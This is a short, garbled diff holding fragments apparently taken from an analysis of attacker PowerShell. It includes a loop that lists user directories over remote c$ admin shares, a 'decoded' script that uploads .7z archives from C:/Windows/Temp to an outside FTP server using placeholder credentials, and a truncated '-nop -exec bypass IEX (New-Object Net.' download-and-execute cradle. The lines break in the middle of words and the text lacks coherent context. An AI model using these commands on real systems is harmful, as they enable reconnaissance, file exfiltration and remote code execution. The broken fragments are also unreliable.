@@ -1,0 +1,14 @@
+
+SilentlyContinue foreach($Directory in Get-ChildItem -Path $PathEnum'/c$/Users' -ErrorAction
+SilentlyContinue) { foreach($SeachDir in $foldersArr) { Get-ChildItem -Path $PathEnum'/c$/Users/'$Directory'/'$SeachDir -ErrorAction
+SilentlyContinue } } } PowerShell reconnaissance script used to enumerate directories $Dir=\"C:/Windows/Temp/\" #ftp server $ftp = \"ftp://<IP Address>/incoming/\" $user =
+\"<username>\" $pass = \"<password>\" $webclient = New-Object System.
+Net.
+WebClient $webclient.
+Credentials = New-Object System.
+Net.
+NetworkCredential($user,$pass) #list every sql server trace file foreach($item in (dir $Dir \"*.7z\")){ \"Uploading $item...\" $uri = New-Object System.
+Uri($ftp+$item.
+Name) $webclient.
+UploadFile($uri, $item.
+FullName) } Decoded FTP upload PowerShell script powershell -nop -exec bypass IEX (New-Object Net.
